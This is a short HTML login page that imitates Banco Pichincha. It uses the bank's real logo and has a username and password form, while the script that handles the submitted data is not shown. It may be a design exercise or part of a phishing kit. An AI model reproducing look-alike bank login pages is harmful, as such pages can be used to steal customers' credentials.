<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login Banco Pichincha</title>
    <link rel="stylesheet" href="./styles.css" />
  </head>
  <body>
    <div class="container">
      <img
        src="https://www.pichincha.com/portal/Portals/0/MainPichincha.svg?ver=_XlM6NWjdDPfjZiQD96oOg%3d%3d"
        alt="Banco Pichincha Logo"
        class="logo"
      />
      <form class="login" method="post">
        <label for="usuario" class="usuario-label">Usuario</label>
        <input
          type="text"
          name="usuario"
          class="usuario-input"
          placeholder="Usuario"
          required
        />

        <label for="contrasena" class="contasena-label">Contraseña</label>
        <input
          type="password"
          name="contrasena"
          class="contrasena-input"
          placeholder="Contraseña"
          required
        />
        <button class="show">Show password</button>
        <button type="submit" class="btn-login">Login</button>
      </form>
    </div>
    <script src="./index.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  </body>
</html>
